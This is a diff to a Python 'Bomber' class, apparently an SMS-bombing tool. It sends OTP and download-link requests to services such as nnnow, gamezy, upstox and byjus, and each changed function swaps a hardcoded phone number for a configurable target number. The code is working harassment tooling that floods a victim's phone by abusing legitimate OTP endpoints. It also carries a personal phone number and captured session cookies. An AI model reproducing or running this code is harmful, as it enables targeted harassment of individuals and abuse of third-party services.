@@ -909,8 +909,7 @@ class Bomber:
 
     def nnow(self):
         url = "https://api.nnnow.com/d/apiV2/otp/resendOtp/v1/flash"
-        monumber = 7984430992
-        payload = "{\"mobileNumber\":"f'"{monumber}"'",\"otpTemplateId\":\"5b4e2e49b70e040008ffbcbe\",\"sessionId\":\"62a01603ead555000c4bca6a\"}"
+        payload = "{\"mobileNumber\":"f'"{self.user_mobile}"'",\"otpTemplateId\":\"5b4e2e49b70e040008ffbcbe\",\"sessionId\":\"62a01603ead555000c4bca6a\"}"
         headers = {
             'cookie': "sess_map=vvyfuxavqcycbtwyfraxtawdwarwzravbesfcabuaxtsrysvduadqdquavtvuxybytbbwzbyucqexbucyfuzqfruvbtsvcdsbrqzbfxdazttzbdqqttuaeqaxredfryavfwfbvetqsdbueqsvuqdebwcfqedddfv",
             'Accept-Language': "en-US,en;q=0.9",
@@ -964,8 +963,7 @@ class Bomber:
 
     def gamezzy(self):
         url = "https://www.gamezy.com/api/user/sendAppDownloadLinkV1"
-        monumber = 7984430992
-        payload = "{\"mobile\":"f'"{monumber}"'"}"
+        payload = "{\"mobile\":"f'"{self.user_mobile}"'"}"
         headers = {
             'authority': "www.gamezy.com",
             'accept': "application/json, text/plain, */*",
@@ -992,8 +990,7 @@ class Bomber:
         url = "https://service.upstox.com/login/open/v3/auth/1fa/otp/generate"
 
         querystring = {"requestId": "WPRO-b07825c9c2"}
-        monumber = 7984430992
-        payload = "{\"data\":{\"mobileNumber\":"f'"{monumber}"'"}}"
+        payload = "{\"data\":{\"mobileNumber\":"f'"{self.user_mobile}"'"}}"
         headers = {
             'cookie': "_gcl_au=1.1.1498453583.1654659024; WZRK_G=524d0c9d0f464abd8677becdbcfef577; _ga=GA1.1.646571292.1654659025; WZRK_S_4W7-R7R-KR5Z=%7B%22p%22%3A1%2C%22s%22%3A1654659025%2C%22t%22%3A1654659025%7D; lead_phone_number=9090909091; _cfuvid=aDSwK6UkDVifGOdOgFmHyoT4IS0wQNQTZiHprSI31ZM-1654659036156-0-604800000; _ga_VFG6NNXYGT=GS1.1.1654659024.1.0.1654659035.0; _uetsid=555b0590e6db11ec802a9d8db14d525e; _uetvid=555b2fe0e6db11eca666d9c8f6b73347",
             'authority': "service.upstox.com",
@@ -1077,8 +1074,7 @@ class Bomber:
 
     def byjus(self):
         url = "https://mtnucleus.byjusweb.com/api/acs/v2/send-otp"
-        monumber = 7984430992
-        payload = "{\"phoneNumber\":"f'"{monumber}"'",\"page\":\"free-trial-classes\"}"
+        payload = "{\"phoneNumber\":"f'"{self.user_mobile}"'",\"page\":\"free-trial-classes\"}"
         headers = {
             'Referer': "https://byjus.com/",
             'Content-Type': "application/json",
